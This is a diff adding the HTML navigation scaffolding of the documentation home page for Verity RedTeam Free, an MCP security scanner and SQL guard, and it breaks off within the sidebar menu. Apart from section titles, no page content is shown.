@@ -1,0 +1,2904 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Open-Core MCP Security Scanner, SQL AST Guard, and Audit Server">
+      
+      
+      
+        <link rel="canonical" href="https://jmartynov.github.io/verityredteam-free/0.2.2/">
+      
+      
+      
+        <link rel="next" href="getting-started/installation/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.2">
+    
+    
+      
+        <title>Verity RedTeam Free</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.57a0d79d.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.fb2fffe2.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#verity-red-team" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <div data-md-color-scheme="default" data-md-component="outdated" hidden>
+        
+      </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="." title="Verity RedTeam Free" class="md-header__button md-logo" aria-label="Verity RedTeam Free" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Verity RedTeam Free
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Home
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/JMartynov/verityredteam-free" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    JMartynov/verityredteam-free
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="getting-started/installation/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Getting Started
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="cli/reference/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  CLI Reference
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="rules/catalog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Security Rules
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="guards/sql-security-guard/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Guards & Runtime
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="mcp/server-and-ides/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  MCP & IDE Integration
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="pro/enterprise_features/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Verity Pro
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="reference/auxiliary_and_benchmarks/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Reference
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="roadmap/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Roadmap & Changelog
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="." title="Verity RedTeam Free" class="md-nav__button md-logo" aria-label="Verity RedTeam Free" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Verity RedTeam Free
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/JMartynov/verityredteam-free" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    JMartynov/verityredteam-free
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="." class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#why-teams-adopt-verity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why teams adopt Verity
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tier-1-must-have-product-core" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 1 — Must-Have Product Core
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tier-2-high-customer-need" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tier 2 — High Customer Need
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#verity-pro" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Verity Pro
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#customer-pain-points-problem-to-solution-playbook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Customer Pain Points &amp; Problem-to-Solution Playbook
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Customer Pain Points &amp; Problem-to-Solution Playbook">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-shadow-mcp-servers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Shadow MCP Servers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-hardcoded-api-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Hardcoded API Keys
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-sql-injection-bola-in-ai-db-agents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. SQL Injection &amp; BOLA in AI DB Agents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-missing-cicd-security-gates" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Missing CI/CD Security Gates
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#feature-matrix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Feature Matrix
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Feature Matrix">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ide-client-coverage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IDE client coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#static-rules-13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Static rules (13)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ast-rules-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AST rules (9)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlsecurityguard-dialects-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SqlSecurityGuard dialects (7)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zero-docker-vulnerable-targets-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Docker vulnerable targets (4)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verity-serve-mcp-tools-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        verity serve MCP tools (4)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#agent-native-mcp-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Agent-Native MCP Server
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#output-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Output formats
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zero-docker-demo-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zero-Docker demo targets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#end-to-end-walkthroughs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        End-to-end walkthroughs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="End-to-end walkthroughs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-1-sqlite-basic-target-with-verity-test-demo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 1: SQLite Basic Target with verity test --demo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-2-postgresql-multi-tenant-target-with-verity-test-demo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 2: PostgreSQL Multi-Tenant Target with verity test --demo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#walkthrough-3-mcp-code-execution-target-with-verity-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough 3: MCP Code Execution Target with verity scan
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#next-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Next steps
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="getting-started/installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="getting-started/quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CLI Reference
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="cli/reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Rules
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Rules
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="rules/catalog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rule Catalog (22 Rules)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guards & Runtime
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Guards & Runtime
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="guards/sql-security-guard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Security Guard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP & IDE Integration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MCP & IDE Integration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="mcp/server-and-ides/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MCP Server & IDEs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="extensibility/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Extensibility & Plugins
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Verity Pro
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Verity Pro
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="pro/enterprise_features/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enterprise Features
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
